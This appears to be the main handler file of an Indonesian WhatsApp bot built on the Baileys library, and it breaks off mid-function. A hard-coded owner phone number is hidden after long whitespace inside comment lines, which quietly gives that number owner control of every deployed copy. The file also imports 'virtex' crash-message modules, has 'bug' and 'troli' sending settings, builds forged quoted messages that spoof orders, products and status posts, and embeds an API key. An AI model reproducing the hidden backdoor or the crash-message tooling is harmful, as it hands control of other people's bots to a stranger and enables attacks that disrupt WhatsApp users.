const
	{
		WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		WAMessageProto,
		ProxyAgent,
		ChatModification,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
		relayWAMessage,
		device,
		Browsers,
		DataView,
        TypedArray,
	} = require("@adiwajshing/baileys")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const util = require('util')
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const PhoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const os = require('os')
const imageToBase64 = require('image-to-base64');
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const { error } = require("qrcode-terminal")
const FormData = require('form-data')
const qrkode = require("qrcode")
const ameClient = require("amethyste-api")
const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
const tod = require('tod-api');
const primbon = require('primbon-scraper')
const RA = require('ra-api')
const { removeBackgroundFromImageFile } = require('remove.bg')
const convert = require('imagemagick')
const ytdl = require('ytdl-core');

// stickwm
const Exif = require('./lib/exif');
const exif = new Exif();



 //******************* LIB FILE ********************\\
const {weton,week,calender,dateIslamic,formatDate, isUrl, makeid, calculate_age, generateMessageTag, runtime, randomNomor, jsonformat, generateProfilePicture, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color.js')
const hx = require("./lib/hxz-api")
const { igDownloader, TiktokDownloader } = require("./lib/gif.js")
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { styleText, baseURI, ytsr, yta, ytv, upload, buffer2Stream, stream2Buffer, ythd} = require('./lib/ytdl')
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const voting = JSON.parse(fs.readFileSync('./lib/voting.json'))
const { addVote, delVote } = require('./lib/vote')
const { hentong, sewabot, donasi, help, info1} = require('./message')
const { msgFilter, addSpam, unSpam, SpamExpired, cekSpam} = require('./lib/antispam')
const { uploadFile1Day, uptotele, uploadImages } = require('./lib/uploadimage') 
const { TelegraPh, UploadFileUgu } = require('./lib/uploader') 
const { recognize } = require('./lib/ocr')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const textpro = require('./lib/textpro')
const simple = require("./lib/simple.js");
const WAConnection = simple.WAConnection(_WAConnection)
const client = new WAConnection()
const reminder = require("./lib/reminder");
const { buggc } = require('./lib/antibuggc.js')
const { wikiSearch } = require('./lib/wiki.js')
const _prem = require("./lib/premium");
const _sewa = require('./lib/sewa')
const game = require("./lib/game");
const { isTicTacToe, getPosTic } = require("./lib/tictactoe");
const tictac = require("./lib/tictac");
const { addAutoClear,autoClearChat,checkAutoClear, checkDataName, createDataId, getDataId, addDataId, removeDataId, checkDataId, checkClaim, getClaim, expiredClaim, addUserClaim, getHit, cmdAdd, expiredCmd } = require("./lib/totalcmd");


const { bad, menu, tekssalah, katahai, katamalem, katasiang, katasore, katalopyou, tekscmd, teksspam, ilhamberkata, ngebucin, badud, ohayo, salam, thanks, anime} = require("./message/messages.js");
const { pShadow,pRomantic,pSmoke,pBurnPapper,pNaruto,pLoveMsg,pMsgGrass,pGlitch,pDoubleHeart,pCoffeCup,pLoveText,pButterfly } = require('./lib/photooxy')
const { mediafireDl } = require('./lib/mediafire')
const translate = require('./lib/translate')

const {getDateId, resetLevelingXp, userXp, userLeveling, getLevelingXp, getLevelingLevel, getLevelingId, addLevelingXp, addLevelingLevel, addUserId } = require("./lib/user");
const { gethitUser, checkHit, AddHit, isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/user");



//hasil editan sendiri
const { addCommands, checkCommands, deleteCommands } = require('./lib/commands')

const { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar } = require("./lib/badword.js");
const { addBanned, unBanned, cekBannedUser } = require("./lib/banned")
const { addBlock, unBlock, cekBlock } = require("./lib/blockuser");

const { addError, deleteError, checkError } = require("./lib/totalerror");
const { addblockcmd, deleteblockcmd, checkblockcmd } = require("./lib/blockcmd");

const { ucapsalamikum, enggakmau, ucapmalam, ucapsiang, ucappagi, botz, unregister, ucaphai, toxicbro, spamnih, loplop } = require("./message/ninamess");




 //******************* VIRTEX FILE ********************\\
//virtex by tsukasa
const { virtex, virtag, philip, emoji1, emoji2, virtex2, virtex3, virtex4, virtex5, virtex8, virtex9, virtex10, virtex11, virtex12, slayer, ngazap, virtexbytsukasa } = require('./virtex/virtex.js')
const { virtex6 } = require('./virtex/virtex6.js')
const { virtex7 } = require('./virtex/virtex7.js')
const { antivirus } = require('./virtex/antivirus.js')

           

 //******************* JSON FILE ********************\\
const { _scommand, commandsDB, setiker, audionye, musiknye, imagenye, videonye, bancht, senbadword, ban } = require("./message/jsonfile");
const { listcmdblock, _reminder, welkom, settings, listerror, premium, _claim, sewa, user } = require("./message/jsonfile");
const { blocked,hitnya } = require("./message/jsonfile");
const AntiSpam = JSON.parse(fs.readFileSync('./database/antispam.json'))
const DataId = JSON.parse(fs.readFileSync('./database/data.json'))


 //******************* STICKER PACK ********************\\
const { gaboleh, spam1, spam2, istigfar, hanyaadmin, jadiinadmin, ucapsalam, samasama, kumsalam } = require("./message/stickerPack.js");

 //******************* FILE PHOTO ********************\\
const virgam = fs.readFileSync('./stik/virgam.jpeg'),
 davizin = fs.readFileSync('./stik/davizinmaker.jpg'),
 girl = fs.readFileSync('./stik/trava.jpg'),
 thumb = fs.readFileSync('./stik/thumb.jpeg'),
 fakethumbnail = fs.readFileSync('./stik/fake.jpeg');











autoreadgc = false
autoreadpc = false
explain = settings.explain
global.Anticall = settings.Anticall
fake1 = settings.copyright
namalu = settings.namalu
publik = settings.publik
namaDocument = settings.namaDocument
ephemeral = false
totalForward = settings.totalForward
prefa = settings.setPrefix.prefix
multi = settings.setPrefix.multi
onepref  = settings.setPrefix.onepref
forwarding = settings.forwarding
nopref = settings.setPrefix.nopref
offline = false
autoblockcmd = settings.autoblockcmd
autobio = settings.autobio
typing= settings.typing
autoread = settings.autoread
autovn = settings.autovn
antibugtroli = settings.antitroli
targetpc = '0'
nomerOwner = settings.nomerlu
nomerbot = settings.nomerbot
fake = settings.namabot
numbernye = '0'
let tebakgambar = []; 
let family100 = []; 
let mtk = []; 
let tebaklirik = [];  
let siapaaku = [];
let tebakkata = [];
let tebakkimia = [];
let tebakbendera = [];
let tebakanime = [];
let caklontong = []
let caklontong1 = []
let nsfw = []
let siminya = []
waktu = '-'
alasan = '-'
listjadibot1 = [];
let tictactoe = [];
jeda = false
gamewaktu = settings.gamewaktu
limitCount = settings.limitCount
sendbug = false
teksChat = settings.antiPrivateChat.teksChat
chatBot = settings.antiPrivateChat.chatBot
gender = settings.gender
autosticker = settings.autosticker
autorespon = settings.autorespon 
copyright = `© ${fake1}`
Loading = settings.Loading 


autoWelcome = settings.setWelcome.autoWelcome        

AutoClearChat = settings.AutoClearChat
autoReport = true

bcTroli = true
bcLokasi = false
bcDokumen = false    

setWeb = settings.setReply.setWeb
setTroli = settings.setReply.setTroli
setMessage = settings.setReply.setMessage
setVideo = settings.setReply.setVideo


fakeToko = settings.setQuoted.fakeToko
fakeKontak = settings.setQuoted.fakeKontak
fakeTeks = settings.setQuoted.fakeTeks
fakeTroli = settings.setQuoted.fakeTroli

jumlahTroli = settings.jumlahTroli

Qoted = settings.setQuoted.Qoted
docType = "docx"
setmenu = settings.setMenu.setmenu

const On =`ᴏɴ`
const Off =`ᴏғғ`
Myprofile = `ᴍʏ ᴘʀᴏғɪʟᴇ`
Mainlagi = `ᴍᴀɪɴ ʟᴀɢɪ`
const extream = ["6285156137901-1632578387@g.us","6285156137901-1633160194@g.us"]
badword = ["asu","Asu","asw","Asw","Ajg","ajg","Anjing","anjing","Bajingan","bajingan","Bjingan","bjingan","Babi","babi","Bacot","bacot","Bcot","bcot","Cacat","cacat","Jancok","jancok","Jncok","jncok","Kontol","kontol","Kntl","kntl","KONTOL","kirek","Kirek","Lonte","lonte","Lnte","lnte","Memek","memek","Mmek","mmek","Pler","pler","Silet","Silit","silit","Silet","Tai","tai","Taek","taek","coeg"]
zenzkey = "officialdittaz"


autoLevel = settings.autoLevel    

const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    _scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return _scommand[position].chats
    }
}

const checkSCommand = (id) => {
    let status = false
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            status = true
        }
    })
    return status
}





   


/*           Recodenya yang teliti ya sayang                                                                              */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Ownerin ="6285156137901@s.whatsapp.net"
/*           ntar klo error jangan salahin gua                                                               */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ownerNumber = [`6285156137901@s.whatsapp.net`,`${nomerOwner}@s.whatsapp.net`,`${nomerbot}@s.whatsapp.net`]
//=================================================//
module.exports = xdev = async (xdev, dev, baterai) => {
	try {
        if (!dev.hasNewMessage) return 
        dev = dev.messages.all()[0]
		if (!dev.message) return                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
		if (dev.key && dev.key.remoteJid == 'status@broadcast') return
		const m = simple.smsg(xdev, dev);
		const senderr = m.sender.split`@`[0]
		const cot = dev.key.fromMe ? xdev.user.jid : xdev.contacts[dev.key.fromMe ? xdev.user.jid : dev.key.remoteJid.endsWith('@g.us') ? dev.participant : dev.key.remoteJid] || { notify: jid.replace(/@.+/, '') }
        const pushnem = dev.key.fromMe ? xdev.user.name : cot.notify || cot.vname || cot.name || '-'
        const sent = dev.key.fromMe ? xdev.user.jid : dev.key.remoteJid.endsWith('@g.us') ? dev.participant : dev.key.remoteJid
		const theOwner = Ownerin.includes(sent)
		const isowner = ownerNumber.includes(sent)
		const metaData = dev.key.remoteJid.endsWith('@g.us')  ? await xdev.groupMetadata(dev.key.remoteJid) : ''
		const memberGroup = dev.key.remoteJid.endsWith('@g.us')  ? metaData.participants : ''
		const botAdmins = dev.key.remoteJid.endsWith('@g.us') ? getGroupAdmins(memberGroup) : ''
		const adminGroup = botAdmins.includes(sent) || false
		const isBotAdmins = botAdmins.includes(xdev.user.jid) || false
		const Antibuggc = checkDataId ("antibuggc", dev.key.remoteJid, DataId) 
		
	     //Antibuggc edited  by official dittaz, thanks to Mbb, Memans and Manik
	    if(Antibuggc && dev.key.remoteJid.endsWith('@g.us')){
	    if(Object.keys(dev.message)[0] === 'ephemeralMessage' && JSON.stringify(dev.message).includes('EPHEMERAL_SETTING') && dev.message.ephemeralMessage.message.protocolMessage.type === 3){ 
		if(adminGroup) return xdev.sendMessage(dev.key.remoteJid, 'Admin grup mah bebas main buggc yekan 😎🤣', MessageType.text)
	    if(isowner) return xdev.sendMessage(dev.key.remoteJid, 'Owner mah bebas ngebug yekan 😎🤣', MessageType.text)
        xdev.sendMessage(dev.key.remoteJid, buggc(senderr,pushnem), MessageType.text)
        if(!isBotAdmins) return 
        await xdev.groupRemove(dev.key.remoteJid, [sent]);
		}
		}
		   
        dev.message = (Object.keys(dev.message)[0] === 'ephemeralMessage') ? dev.message.ephemeralMessage.message : dev.message        
        me = xdev.user
        const antibot = m.isBaileys
        const content = JSON.stringify(dev.message)
		const from = dev.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const type = Object.keys(dev.message)[0]        
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		//const cmd = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
		const cmd = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
        var pes = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : ''
        const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
        const messagesC = pes.slice(0).trim()
       
         if (multi){
		 var prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
        } else {
        if (nopref){
         prefix = ''
         } else {
         prefix = prefa
         }
         }  
        global.prefix
        const body = (type === 'conversation' && dev.message.conversation.startsWith(prefix)) ? dev.message.conversation : (type == 'imageMessage') && dev.message[type].caption.startsWith(prefix) ? dev.message[type].caption : (type == 'videoMessage') && dev.message[type].caption.startsWith(prefix) ? dev.message[type].caption : (type == 'extendedTextMessage') && dev.message[type].text.startsWith(prefix) ? dev.message[type].text : (type == 'listResponseMessage') && dev.message[type].singleSelectReply.selectedRowId ? dev.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && dev.message[type].selectedButtonId ? dev.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(dev.message[type].fileSha256.toString('base64')) !== null && getCmd(dev.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message[type].fileSha256.toString('base64')) : ""
        //body = (type === 'listResponseMessage' && dev.message.listResponseMessage.title) ? dev.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && dev.message.buttonsResponseMessage.selectedButtonId) ? dev.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && dev.message.conversation.startsWith(prefix)) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption.startsWith(prefix) ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption.startsWith(prefix) ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text.startsWith(prefix) ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budy = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
        button = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedDisplayText : ''
        listmes = (type == 'listResponseMessage') ? dev.message.listResponseMessage.title : ''
		//const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
        const c = args.join(" ")
		const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
		const timeWit= moment().tz('Asia/Makassar').format('HH:mm:ss')
        const timeWita = moment().tz('Asia/Jayapura').format('HH:mm:ss')
		const botNumber = xdev.user.jid
		const botNumberss = xdev.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = dev.key.fromMe ? xdev.user.jid : isGroup ? dev.participant : dev.key.remoteJid
		const senderNumber = sender.split("@")[0] 
		const isOwner = ownerNumber.includes(sender)
		const totalchat = await xdev.chats.all()
		const groupMetadata = isGroup ? await xdev.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
        const conts = dev.key.fromMe ? xdev.user.jid : xdev.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = dev.key.fromMe ? xdev.user.name : conts.notify || conts.vname || conts.name || '-'
        chatss = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
        const forward = { forwardingScore: totalForward, isForwarded: forwarding, sendEphemeral: ephemeral}
        
       
        
        const isBanned = cekBannedUser(sender, ban)
        const isHit = checkHit(senderNumber, user)
        
        const timestampp = speed();
	    const latensi = speed() - timestampp
        const arg = budy.slice(command.length + 2, budy.length)
        const atibot = dev.isBaileys
        const gcounti = settings.gcount
        const itsMe = dev.key.fromMe
        const mentionByTag = type == "extendedTextMessage" && dev.message.extendedTextMessage.contextInfo != null ? dev.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && dev.message.extendedTextMessage.contextInfo != null ? dev.message.extendedTextMessage.contextInfo.participant || "" : ""
 
 
 
   //User 
  const userLevel = getLevelingLevel(senderNumber, user)
  const userExp = getLevelingXp(senderNumber, user)
  const userId = getLevelingId(senderNumber, user)
  const amountExp = Math.floor(Math.random() * 10) + 50
  const requiredExp = 1000 * userLevel
  const userPersen = userExp/requiredExp*100
  const userVerified = getDateId(senderNumber, user)
   
//VN saat ada yg maggil bot
const iyakak = botz[Math.floor(Math.random() * botz.length)]              
const ucapbot = fs.readFileSync(iyakak)

//Vn saat command tidak ditemukan
const unreg = unregister[Math.floor(Math.random() * unregister.length)]              
const gakada = fs.readFileSync(unreg)

//VN saat ada yang toxic
const anying = toxicbro[Math.floor(Math.random() * toxicbro.length)]              
const astaga = fs.readFileSync(anying)

//VN saat ada yg akses fitur owner
const ahenggak = enggakmau[Math.floor(Math.random() * enggakmau.length)]              
const gakmau = fs.readFileSync(ahenggak)

//VN saat ada yg bilang selamat pagi
const ay = ucappagi[Math.floor(Math.random() * ucappagi.length)]
const oahyo = fs.readFileSync(ay)

//VN saat ada yg bilang selamat malam
const ayuk = ucapmalam[Math.floor(Math.random() * ucapmalam.length)]
const oyasumi = fs.readFileSync(ayuk)

//VN saat ada yg bilang selamat siang
const yayuk = ucapsiang[Math.floor(Math.random() * ucapsiang.length)]
const koniciwa = fs.readFileSync(yayuk)

//VN saat ada yg spam
const alal = spamnih[Math.floor(Math.random() * spamnih.length)]
const nospam = fs.readFileSync(alal)

//VN saat ada yg bilang halo
const ulul = ucaphai[Math.floor(Math.random() * ucaphai.length)]
const moshimos = fs.readFileSync(ulul)

//VN saat ada yg bilang asalamualaikum
const alul = ucapsalamikum[Math.floor(Math.random() * ucapsalamikum.length)]
const walaikumsalam = fs.readFileSync(alul)

//VN saat ada yg bilang i love u
const awlu = loplop[Math.floor(Math.random() * loplop.length)]
const lopyoutoo = fs.readFileSync(awlu)

//Random nama anime
const karakter = anime[Math.floor(Math.random() * anime.length)]

//Teks untuk pertanyaan game yg salah
const jawabansalah = tekssalah[Math.floor(Math.random() * tekssalah.length)]
           
const textcmd = tekscmd[Math.floor(Math.random() * tekscmd.length)]                         
const textspam = teksspam[Math.floor(Math.random() * teksspam.length)]                         

 
//Security / Keamanan
const Toxic = checkDataId ("antibadword", from, DataId) 
const isBanchat = checkDataId ("banchat", from, DataId) 
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isVote = isGroup ? voting.includes(from) : false
const isAntiLink = checkDataId ("antilink", from, DataId) 
const AntiVirtex = checkDataId ("antivirtex", from, DataId) 
const isAntilinkGc = checkDataId ("antilinkgc", from, DataId) 
const isAntihidetag = checkDataId ("antihidetag", from, DataId) 
const isAntiviewonce = checkDataId ("antivo", from, DataId) 
const isKickarea = checkDataId ("antiasing", from, DataId) 
const isWelkom = isGroup ? JSON.parse(fs.readFileSync('./database/welkom.json')).includes(from) : false
const isExtream = isGroup ? extream.includes(from) : false
const isSimi = isGroup ? siminya.includes(from) : false
const isAntidel = isGroup ? xdev.antidel.includes(from) : false
const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
const gcount = isPremium ? gcounti.prem : gcounti.user






//Auto READ   
if(autoread){
 xdev.chatRead(from, "read").catch(() => { })
 }

// Auto Read Group 
if(autoreadgc){
var readgc =  xdev.chats.array.filter(v => v.jid.endsWith('g.us'))
readgc.map( async ({ jid }) => {
 xdev.chatRead(jid, "read")
})
}

// Auto Read Private 
if(autoreadpc){
var readpc =  xdev.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
readpc.map( async ({ jid }) => {
 xdev.chatRead(jid, "read")
})
}


 //******************* 》MESSGAGE RESPON《 ********************\\
mess = {
wait: 'Tunggu sebentar ya kak',
search: 'Searching...',
admin: 'Kusus admin',
owner: 'Khusus owner',
success: 'Berhasil!',
limit: `[❕] Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`,
eror: 'Eror To Again',
claimOnAlready: `Kamu sudah melakukan claim sebelumnya, Harap claim lagi pada jam ${getClaim(senderNumber, _claim)}.`,
wrongFormat: 'Format salah, coba liat lagi di menu',
error: {
stick: 'bukan sticker itu:v',
api: 'Error api atau linkya mungkin',
Iv: 'Linknya error:v'
},
only: {
prem : 'Premium special features! Chat owner to get Premium access!',
group: 'Fitur Dapat digunakan di Dalam Group!',
ownerG: 'Fitur Dapat digunakan oleh Owner Group!',
ownerB: 'Fitur Khusus Owner Bot!',
admin: 'Fitur dapat Digunakan oleh Admin Group!',
Badmin: 'Fitur dapat Digunakan Setelah Bot menjadi ADMIN!'
 }
 }
            

//Ucapan Waktu  
if(timeWib < "23:59:00"){ var ucapanWaktu = 'Selamat malam' }
if(timeWib < "19:00:00"){ var ucapanWaktu = 'Selamat malam'}
if(timeWib < "18:00:00"){ var ucapanWaktu = 'Selamat sore'}
if(timeWib < "15:00:00"){ var ucapanWaktu = 'Selamat siang'}
if(timeWib < "11:00:00"){ var ucapanWaktu = 'Selamat pagi'}
if(timeWib < "06:00:00"){ var ucapanWaktu = 'Selamat pagi'  }      
        
//FAKE REPLY  
const ftoko = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./stik/fake.jpeg`)},"title": `${pushname}`,"description": `${ucapanWaktu} kak`,"currencyCode": "IDR", "priceAmount1000": `${getBalance(senderNumber, user)}`, "retailerId": `Rp10`,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const ftext = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/fake.jpeg')}}}
const ftroli = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : jumlahTroli, status: 1,surface : 2,message: `${fake}\n${ucapanWaktu} kak`,orderTitle: `${ucapanWaktu} kak`,thumbnail: fs.readFileSync('./stik/thumb.jpeg'), sellerJid: `0@s.whatsapp.net`}}}
const fsticker = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
const fvn = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds": "9999999","ptt": "true"}}}
const floc = { key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6289530863358-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${fake}`,}}}
const fvideo = { key: {fromMe: false,participant: `62895619083555@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '-99999', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const fgc = { key: {"fromMe": false,"participant": "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "62895619083555-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "P", "caption": `${fake}`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const fgif = { key: {fromMe: false,participant: `6285842369183@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}} 
const fimage = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: {"imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": fake, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'), "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
                


//Set Quoted
if(Qoted === "ftoko"){
var setQuoted = ftoko
} else if(Qoted === "fkontak"){
var setQuoted = fkontak
} else if(Qoted === "ftext"){
var setQuoted = ftext
}else if(Qoted === "ftroli"){
var setQuoted = ftroli
} else if(Qoted === "fsticker"){
var setQuoted = fsticker
} else if(Qoted === "fvn"){
var setQuoted = fvn
} else if(Qoted === "floc"){
var setQuoted = floc
}else if(Qoted === "fvideo"){
var setQuoted = fvideo
} else if(Qoted === "fgc"){
var setQuoted = fgc
} else if(Qoted === "fgif"){
var setQuoted = fgif
} else if(Qoted === "fimage"){
var setQuoted = fimage
} else if(Qoted === "dev"){
var setQuoted = dev
}



//SetReply
const setReply = async(teks) =>{
if(setWeb){
